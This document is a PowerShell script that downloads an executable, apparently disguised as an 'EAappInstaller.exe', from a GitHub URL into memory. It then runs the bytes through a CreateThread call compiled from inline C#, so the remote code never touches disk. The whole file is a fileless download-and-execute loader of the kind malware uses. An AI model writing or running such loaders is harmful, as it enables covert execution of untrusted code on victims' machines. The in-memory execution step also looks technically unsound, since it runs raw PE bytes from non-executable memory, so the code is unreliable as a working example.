# URL of the .exe file
$url = "https://github.com/whatsakb/l/raw/refs/heads/main/EAappInstaller.exe"

# Download the executable into memory
$response = Invoke-WebRequest -Uri $url -UseBasicParsing
$bytes = $response.Content

# Allocate memory for the executable
$buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bytes.Length)
[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $buffer, $bytes.Length)

# Define delegates for execution
$ExecuteAssembly = @"
using System;
using System.Runtime.InteropServices;

public class ExeRunner {
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
}
"@

# Compile the C# assembly
Add-Type -TypeDefinition $ExecuteAssembly -Language CSharp

# Execute the binary in memory
$threadId = [IntPtr]::Zero
$threadHandle = [ExeRunner]::CreateThread([IntPtr]::Zero, 0, $buffer, [IntPtr]::Zero, 0, [ref] $threadId)
[ExeRunner]::WaitForSingleObject($threadHandle, 0xFFFFFFFF)
